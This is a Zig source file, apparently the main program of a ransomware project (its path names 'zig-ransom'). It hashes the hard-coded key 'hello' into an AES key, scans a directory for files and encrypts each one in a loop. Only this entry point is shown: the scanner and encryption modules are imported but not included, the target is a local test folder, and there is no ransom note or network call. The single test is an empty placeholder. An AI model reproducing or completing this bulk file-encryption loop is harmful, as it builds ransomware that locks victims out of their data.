const std = @import("std");
const expect = std.testing.expect;

const scanner = @import("./core/scanner.zig");
const engine = @import("./core/engine.zig");

const aes = std.crypto.aead.aes_gcm.Aes256Gcm;

const ArenaAllocator = std.heap.ArenaAllocator;
var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
const allocator = arena.allocator(); 

pub fn main() !void {
    const key = "hello";
    var digest = std.mem.zeroes([std.crypto.hash.sha2.Sha512_256.digest_length] u8);

    std.crypto.hash.sha2.Sha512_256.hash(key, &digest, .{});
    std.log.debug("{s} -> 0x{x}", .{key, digest});

    const startPath = "/mnt/07278d6f-dcd5-4540-ae3f-dc7f08c050e4/Dev/zig-ransom/tests/";
    const fileList = try scanner.scanDir(allocator, startPath);

    var i: usize = 0;
    while (i < fileList.items.len) {
        const filePath = fileList.items[i];
        const file = try engine.File.init(allocator, filePath);

        try file.encrypt(allocator, digest);

        std.log.debug("{any}", .{file});

        i += 1;
    }
}


test "Coorect chunk division" {
    try expect(true);
}